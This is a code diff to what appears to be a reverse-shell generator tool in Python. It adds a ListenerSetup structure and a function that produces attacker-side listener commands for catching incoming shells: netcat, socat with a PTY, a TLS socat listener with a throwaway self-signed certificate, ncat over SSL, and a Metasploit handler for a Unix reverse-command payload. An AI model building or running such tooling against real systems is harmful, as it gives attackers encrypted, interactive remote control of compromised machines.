@@ -1,7 +1,7 @@
 import random
 import string
 from abc import ABC, abstractmethod
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 
 _RESERVED = {
     "sh", "bash", "zsh", "nc", "ip", "ls", "cd", "rm", "cp", "mv",
@@ -15,6 +15,31 @@ TTY_UPGRADE = (
 )
 
 LISTENER_FMT = "rlwrap nc -lvnp {lport}"
+
+
+@dataclass
+class ListenerSetup:
+    basic: str
+    pty: str
+    tls: str
+    ncat: str
+    msf: str
+
+
+def build_listener_setup(lhost: str, lport: int) -> "ListenerSetup":
+    tls_setup = (
+        f"openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem "
+        f"-days 7 -nodes -subj '/CN=x' 2>/dev/null\n"
+        f"socat OPENSSL-LISTEN:{lport},cert=/tmp/cert.pem,key=/tmp/key.pem,verify=0 "
+        f"file:`tty`,raw,echo=0"
+    )
+    return ListenerSetup(
+        basic=LISTENER_FMT.format(lport=lport),
+        pty=f"socat -d -d file:`tty`,raw,echo=0 TCP4-LISTEN:{lport}",
+        tls=tls_setup,
+        ncat=f"ncat --ssl -lvnp {lport}",
+        msf=msf_handler("payload/cmd/unix/reverse", lhost, lport),
+    )
 
 
 @dataclass
@@ -44,6 +69,7 @@ class ShellResult:
     listener: str | None = None
     tty_upgrade: str | None = None
     msf_compat: str | None = None
+    listener_setup: "ListenerSetup | None" = None
 
 
 class RandomNamePool:
